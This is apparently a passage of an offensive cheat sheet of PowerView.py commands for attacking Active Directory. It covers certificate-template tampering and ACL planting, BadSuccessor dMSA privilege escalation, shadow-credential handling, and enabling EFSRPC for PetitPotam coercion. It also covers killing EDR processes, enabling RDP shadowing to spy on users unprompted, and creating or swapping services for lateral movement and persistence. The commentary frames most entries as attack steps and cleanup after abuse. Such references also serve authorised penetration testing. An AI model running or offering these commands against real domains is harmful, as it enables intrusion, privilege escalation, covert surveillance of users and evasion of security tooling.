Edits attributes on a certificate template (e.g. EKU values). Building block for ADCS misconfig abuse.

```sh title:"PowerView.py Create Modify CA Template"
Set-DomainCATemplate -Identity $template -Set '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute (e.g. pKIExtendedKeyUsage)"
var value --- --header "Value (e.g. Client Authentication)"
-->

### Append to CA template

Create append to CA template with PowerView.py.

Appends to a multi-valued template attribute without overwriting the rest.

```sh title:"PowerView.py Create Append to CA Template"
Set-DomainCATemplate -Identity $template -Append '$attribute=$value'
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute"
var value --- --header "Value to append"
-->

### Clear CA template attribute

Create clear CA template attribute with PowerView.py.

Clears an attribute on a CA template. Cleanup after template tampering.

```sh title:"PowerView.py Create Clear CA Template Attribute"
Set-DomainCATemplate -Identity $template -Clear $attribute
```
<!-- cheat
var template --- --header "Template name"
var attribute --- --header "Attribute to clear"
-->

### Duplicate CA template

Read duplicate CA template with PowerView.py.

Adds a new CA template by duplicating an existing one. Stage a controlled vulnerable template.

```sh title:"PowerView.py Read Duplicate CA Template"
Add-DomainCATemplate -Duplicate $source -Name $name -DisplayName "$display"
```
<!-- cheat
var source --- --header "Source template to duplicate"
var name --- --header "New template name"
var display --- --header "New template display name"
-->

### Add ACL to CA template

Add ACL to CA template with PowerView.py.

Grants rights (`Enroll`, `Write`, `All`) on a certificate template to a principal. Plant your own enrolment access.

```sh title:"PowerView.py Add ACL to CA Template"
Add-DomainCATemplateAcl -Template $template -PrincipalIdentity $principal -Rights $rights
```
<!-- cheat
var template --- --header "Template name"
var principal --- --header "Principal to grant rights to"
var rights --- --header "Rights (e.g. Enroll)"
-->

### Remove CA template

Remove CA template with PowerView.py.

Removes a certificate template from AD CS. Cleanup after planting and abusing a template.

```sh title:"PowerView.py Remove CA Template"
Remove-DomainCATemplate -Identity $template
```
<!-- cheat
var template --- --header "Template to remove"
-->

## Service Accounts (gMSA/dMSA)

### Add gMSA

Add gMSA with PowerView.py.

Creates a gMSA with a chosen `PrincipalsAllowedToRetrieveManagedPassword`. Stage a controllable gMSA for testing.

```sh title:"PowerView.py Add GMSA"
Add-DomainGMSA -Identity $name -PrincipalsAllowedToRetrieveManagedPassword "$principal"
```
<!-- cheat
var name --- --header "New gMSA name"
var principal --- --header "Principal allowed to retrieve password (e.g. Domain Admins)"
-->

### Remove gMSA

Remove gMSA with PowerView.py.

Removes a group-managed service account. Cleanup primitive.

```sh title:"PowerView.py Remove GMSA"
Remove-DomainGMSA -Identity $name
```
<!-- cheat
var name --- --header "gMSA to remove"
-->

### Add dMSA

Add dMSA with PowerView.py.

Creates a dMSA, optionally tied to a victim user via `SupersededAccount`. Building block for BadSuccessor-style attacks.

```sh title:"PowerView.py Add DMSA"
Add-DomainDMSA -Identity $name -SupersededAccount $victim
```
<!-- cheat
var name --- --header "New dMSA name"
var victim --- --header "Account to be superseded"
-->

### Remove dMSA

Remove dMSA with PowerView.py.

Removes a delegated managed service account. Cleanup primitive.

```sh title:"PowerView.py Remove DMSA"
Remove-DomainDMSA -Identity $name
```
<!-- cheat
var name --- --header "dMSA to remove"
-->

### BadSuccessor (dMSA escalation)

Run BadSuccessor (dMSA escalation) with PowerView.py.

Exploits the dMSA successor relationship by superseding a high-value account with an attacker-controlled dMSA. Privesc against vulnerable forests.

```sh title:"PowerView.py Run BadSuccessor (dMSA Escalation)"
Invoke-BadSuccessor -DMSAName "$dmsa" -TargetIdentity "$target"
```
<!-- cheat
var dmsa --- --header "Attacker-controlled dMSA (e.g. evil_dmsa)"
var target --- --header "Target identity (e.g. Domain Admins)"
-->

## Shadow Credentials Extras

### List shadow credential device IDs

List shadow credential device IDs with PowerView.py.

Reads existing `KeyCredentialLink` entries so you can pick a specific Device ID for surgical removal.

```sh title:"PowerView.py List Shadow Credential Device IDs"
Set-ShadowCredential -Identity $target -List
```
<!-- cheat
var target --- --header "Target identity"
-->

### Remove specific shadow credential

Remove specific shadow credential with PowerView.py.

Removes a single key credential by its Device ID. Surgical cleanup after abuse.

```sh title:"PowerView.py Remove Specific Shadow Credential"
Remove-ShadowCredential -Identity $target -DeviceId $deviceid
```
<!-- cheat
var target --- --header "Target identity (e.g. DC01$)"
var deviceid --- --header "Device ID GUID"
-->

### Clear all shadow credentials

Dump clear all shadow credentials with PowerView.py.

Wipes every `msDS-KeyCredentialLink` entry. Careful - also removes legitimate Windows Hello entries.

```sh title:"PowerView.py Dump Clear All Shadow Credentials"
Remove-ShadowCredential -Identity $target -All
```
<!-- cheat
var target --- --header "Target identity"
-->

## Exchange

### List Exchange servers

List exchange servers with PowerView.py.

Enumerates Exchange servers and runs a vulnerability check. Fast way to find high-value Exchange targets.

```sh title:"PowerView.py List Exchange Servers"
Get-ExchangeServer -Properties cn,serialNumber
```
<!-- cheat -->

### List mailboxes

List mailboxes with PowerView.py.

Enumerates Exchange mailboxes, optionally filtered to a specific identity. Maps mailbox-to-user relationships.

```sh title:"PowerView.py List Mailboxes"
Get-ExchangeMailbox -Identity $identity
```
<!-- cheat
var identity --- --header "Mailbox identity (e.g. administrator)"
-->

### List Exchange databases

List exchange databases with PowerView.py.

Lists Exchange databases. Useful for incident scoping and locating mailbox stores.

```sh title:"PowerView.py List Exchange Databases"
Get-ExchangeDatabase
```
<!-- cheat -->

## Coercion Extras

### Enable EFSRPC

Enable EFSRPC with PowerView.py.

Enables the EFS RPC interface on a remote host - opens the PetitPotam coercion surface. Use when hardening has turned it off.

```sh title:"PowerView.py Enable EFSRPC"
Enable-EFSRPC -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer (e.g. DC01)"
-->

## Misc

### Resolve SID

Run resolve SID with PowerView.py.

Resolves a SID into its principal name. Quick helper when reading raw ACL output.

```sh title:"PowerView.py Run Resolve SID"
ConvertFrom-SID -ObjectSID $sid
```
<!-- cheat
var sid --- --header "SID (e.g. S-1-5-21-xxx-512)"
-->

### Decode UAC value

Decode UAC value with PowerView.py.

Converts a `userAccountControl` integer into readable flags. Saves the constant-table lookup.

```sh title:"PowerView.py Decode UAC Value"
ConvertFrom-UACValue -Value $value
```
<!-- cheat
var value --- --header "UAC value (e.g. 66048)"
-->

### Named pipes on host

Run named pipes on host with PowerView.py.

Lists named pipes exposed by a remote host. Identifies interesting RPC services and EDR endpoints.

```sh title:"PowerView.py Run Named Pipes on Host"
Get-NamedPipes -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Optional pipe name filter (e.g. sqlsvc)"
-->

### Local users on host

Dump local users on host with PowerView.py.

Reads the local user database from a remote computer via SAMR. Finds stale local accounts.

```sh title:"PowerView.py Dump Local Users on Host"
Get-LocalUser -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (network) sessions

Enumerate logged on (network) sessions with PowerView.py.

Pulls logged-on users from a remote computer via `NetWkstaUserEnum`. Complements `Get-NetSession`.

```sh title:"PowerView.py Enumerate Logged on (network) Sessions"
Get-NetLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Logged-on (registry)

Run logged on (registry) with PowerView.py.

Reads `HKU` over the wire to identify logged-on users by their loaded profile hive. Different vantage from `Get-NetLoggedOn`.

```sh title:"PowerView.py Run Logged on (registry)"
Get-RegLoggedOn -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Computer info

Show computer info with PowerView.py.

Retrieves OS and hardware details from a remote host via SMB. Sanity check before deeper interaction.

```sh title:"PowerView.py Show Computer Info"
Get-NetComputerInfo -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Terminal sessions

List terminal sessions with PowerView.py.

Lists RDP/console sessions on a remote computer. Pair with `Logoff-Session` for session management.

```sh title:"PowerView.py List Terminal Sessions"
Get-NetTerminalSession -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disconnect terminal session

Run disconnect terminal session with PowerView.py.

Tears down a specific terminal session on a remote host. Kicks an operator or clears a stale session.

```sh title:"PowerView.py Run Disconnect Terminal Session"
Remove-NetTerminalSession -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID (integer)"
-->

### Log off session

Run log off session with PowerView.py.

Calls `WTSLogoffSession` on a remote host to forcibly log a user out. Aggressive but useful during takedown.

```sh title:"PowerView.py Run Log Off Session"
Logoff-Session -Computer $computer -SessionId $sessionid
```
<!-- cheat
var computer --- --header "Target computer"
var sessionid --- --header "Session ID to log off"
-->

### Kill remote process

Run kill remote process with PowerView.py.

Stops a process on a remote host by PID. Useful against EDR or troublesome services.

```sh title:"PowerView.py Run Kill Remote Process"
Stop-NetProcess -Computer $computer -Pid $pid
```
<!-- cheat
var computer --- --header "Target computer"
var pid --- --header "Target PID"
-->

### Shut down host

Run shut down host with PowerView.py.

Issues a remote shutdown over SMB. Disruptive but legitimate maintenance primitive.

```sh title:"PowerView.py Run Shut Down Host"
Stop-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Restart host

Start restart host with PowerView.py.

Issues a remote reboot. Often used to apply changes that require a restart (e.g. RDP enable).

```sh title:"PowerView.py Start Restart Host"
Restart-Computer -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable RDP

Enable RDP with PowerView.py.

Enables Remote Desktop on a remote host via registry. Pair with a reboot to take effect.

```sh title:"PowerView.py Enable RDP"
Enable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable RDP

Disable RDP with PowerView.py.

Disables Remote Desktop on a remote host. Cleanup after RDP enable.

```sh title:"PowerView.py Disable RDP"
Disable-RDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Enable Shadow RDP

Enable shadow RDP with PowerView.py.

Enables RDP shadowing so a remote session can be observed without prompting. Stealthy spy on interactive users.

```sh title:"PowerView.py Enable Shadow RDP"
Enable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable Shadow RDP

Disable shadow RDP with PowerView.py.

Disables RDP shadowing. Cleanup after Shadow RDP usage.

```sh title:"PowerView.py Disable Shadow RDP"
Disable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Pop message box

Run pop message box with PowerView.py.

Pops a Windows message box on a remote host's interactive session. Mostly exercise/check-in fodder.

```sh title:"PowerView.py Run Pop Message Box"
Invoke-MessageBox -Computer $computer -Title "$title" -Message "$message"
```
<!-- cheat
var computer --- --header "Target computer"
var title --- --header "Box title"
var message --- --header "Body text"
-->

### Add Windows service

Add windows service with PowerView.py.

Creates a service on a remote host pointing at a chosen binary. Classic lateral-movement and persistence primitive.

```sh title:"PowerView.py Add Windows Service"
Add-NetService -Computer $computer -Name $name -DisplayName "$display" -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var display --- --header "Display name"
var path --- --header "Binary path (e.g. C:\\svc.exe)"
-->

### Set service attributes

Set service attributes with PowerView.py.

Updates an existing service's binary path, display name, or start type. Swap a service binary or disable defenders.

```sh title:"PowerView.py Set Service Attributes"
Set-NetService -Computer $computer -Name $name -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var path --- --header "New binary path"
-->

### Start service

Start service with PowerView.py.

Starts a Windows service on a remote host. Triggers binary execution after a service mod.

```sh title:"PowerView.py Start Service"
Start-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Stop service

Run stop service with PowerView.py.

Stops a Windows service on a remote host. Mirror of `Start-NetService` for cleanup or attacker actions.

```sh title:"PowerView.py Run Stop Service"
Stop-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Remove service

Remove service with PowerView.py.

Deletes a Windows service on a remote host. Final cleanup after service abuse.

```sh title:"PowerView.py Remove Service"
Remove-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Kick SMB session

Run kick SMB session with PowerView.py.

Removes a remote SMB session connected to a host. Kicks an operator off a share without rebooting.

```sh title:"PowerView.py Run Kick SMB Session"
Remove-NetSession -Computer $computer -TargetSession "$session"
```
<!-- cheat
var computer --- --header "Target computer"
var session --- --header "Target session (e.g. \\\\10.10.10.5)"
-->

### SCCM enumeration

Find SCCM enumeration with PowerView.py.

Looks for SCCM/MECM installations and runs reachable checks. Often-overlooked privesc surface.

```sh title:"PowerView.py Find SCCM Enumeration"
Get-DomainSCCM -CheckDatalib
```
<!-- cheat -->

### WDS enumeration

Dump WDS enumeration with PowerView.py.

Finds Windows Deployment Services config in AD. WDS images and admin accounts are a recurring source of leaked secrets.

```sh title:"PowerView.py Dump WDS Enumeration"
Get-DomainWDS
```
<!-- cheat -->
